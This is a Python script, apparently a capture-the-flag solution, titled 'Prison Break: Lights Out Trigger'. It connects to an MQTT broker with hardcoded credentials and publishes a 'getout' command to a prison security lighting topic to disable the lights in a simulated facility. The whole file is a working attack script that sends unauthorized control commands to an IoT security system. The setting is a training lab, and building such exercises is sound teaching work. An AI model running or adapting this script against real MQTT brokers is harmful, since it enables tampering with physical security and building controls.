#!/usr/bin/env python3

import paho.mqtt.client as mqtt
import time
import sys

# --- Player Configuration ---
# IMPORTANT: You MUST replace the placeholder values below
#            with the information found in the prison systems!
TARGET_TOPIC = "prison/security/lightsout/"  # EDIT THIS: The specific topic to publish to.
COMMAND_PAYLOAD = "getout"          # EDIT THIS: The specific command phrase.
# ---------------------------

# --- MQTT Configuration (Should match the CTF setup) ---
BROKER_HOST = "198.18.128.11" # IP of the Mosquitto broker
BROKER_PORT = 1883
MQTT_USERNAME = "iotuser"     # Username for MQTT
MQTT_PASSWORD = "iot"         # Password for MQTT

# --- MQTT Callbacks ---
# Corrected on_connect signature
def on_connect(client, userdata, flags, rc, properties=None):
    """Callback for connection results."""
    connack_string = "(Unknown)"
    try: connack_string = mqtt.connack_string(rc) # Get descriptive string for code
    except ValueError: pass
    if rc == 0:
        print(f"[+] Connected successfully to MQTT broker: {BROKER_HOST}")
        publish_command(client)
    else:
        print(f"[!] MQTT Connection failed code {rc} ({connack_string}). Check broker details/credentials.")
        try: client.disconnect(); client.loop_stop()
        except Exception: pass
        sys.exit(1)

# Corrected on_publish signature
def on_publish(client, userdata, mid, rc, properties=None):
    """Callback when publish completes (for QoS > 0)."""
    # rc is new in V2 API, indicating PUBACK reason code (0 usually means success)
    print(f"[+] Command '{COMMAND_PAYLOAD}' publish acknowledged by broker (MID: {mid}, RC: {rc}).")
    print("[*] Check the hidden website for status change!")
    time.sleep(0.5)
    client.disconnect()

# *** MODIFIED on_disconnect signature to accept 5 args ***
def on_disconnect(client, userdata, flags, reason_code, properties=None):
    """Callback for disconnections (MQTT v2 signature)."""
    # reason_code replaced rc for clarity (0 is normal disconnect)
    # flags might contain disconnect flags (less common usage)
    if reason_code == 0:
        print("[*] MQTT connection closed gracefully.")
    else:
        disconnect_string = "(Unknown reason code)"
        # Try getting reason string (might require newer paho)
        try: disconnect_string = mqtt.error_string(reason_code)
        except: pass # Ignore if function not available
        print(f"\n[!] Disconnected unexpectedly from MQTT broker (Reason Code: {reason_code} - {disconnect_string}).")
    # loop_forever() will exit upon disconnect


def publish_command(client):
     """Publishes the command payload to the target topic."""
     print(f"[*] Sending command '{COMMAND_PAYLOAD}' to topic '{TARGET_TOPIC}'...")
     try:
         result, mid = client.publish(TARGET_TOPIC, payload=COMMAND_PAYLOAD, qos=1)
         if result != mqtt.MQTT_ERR_SUCCESS:
             print(f"[!] Failed to queue publish command locally. Error code: {result}")
             client.disconnect()
         # Actual success confirmed by on_publish callback
     except Exception as e:
         print(f"[!] Error publishing command: {e}")
         client.disconnect()


# --- Main Execution ---
if __name__ == "__main__":
    print("--- Prison Break: Lights Out Trigger ---")

    if "CHANGE_ME" in TARGET_TOPIC or "CHANGE_ME" in COMMAND_PAYLOAD:
        print("\n[ERROR] Please edit the script first!")
        print("        Replace the placeholder values for TARGET_TOPIC and COMMAND_PAYLOAD")
        print("        with the information found during your recon.")
        sys.exit(1)

    print(f"[*] Target Topic:     {TARGET_TOPIC}")
    print(f"[*] Command Payload:  {COMMAND_PAYLOAD}")

    try:
        # Specify V2 explicitly for newer paho-mqtt
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"attacker-lightsout-{time.time()}")
        print("[INFO] Using MQTT Callback API Version 2.")
    except AttributeError:
        print("[INFO] Using older MQTT Callback API Version 1.")
        client = mqtt.Client(client_id=f"attacker-lightsout-{time.time()}")

    client.on_connect = on_connect
    client.on_publish = on_publish
    client.on_disconnect = on_disconnect

    if MQTT_USERNAME and MQTT_PASSWORD:
        client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)

    try:
        print(f"[*] Connecting to broker {BROKER_HOST}:{BROKER_PORT}...")
        client.connect(BROKER_HOST, BROKER_PORT, 60)
        client.loop_forever() # Blocks until disconnect

    except ConnectionRefusedError:
         print(f"\n[!] ERROR: Connection refused. Broker might be down or inaccessible.")
    except KeyboardInterrupt:
         print("\n[*] Script interrupted by user.")
         # Attempt graceful disconnect on Ctrl+C
         try: client.disconnect()
         except Exception: pass
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
    finally:
        print("[*] Cleaning up MQTT connection (if loop stopped)...")
        try:
             client.loop_stop()
        except Exception as stop_err:
            pass
        print("[*] Script finished.")
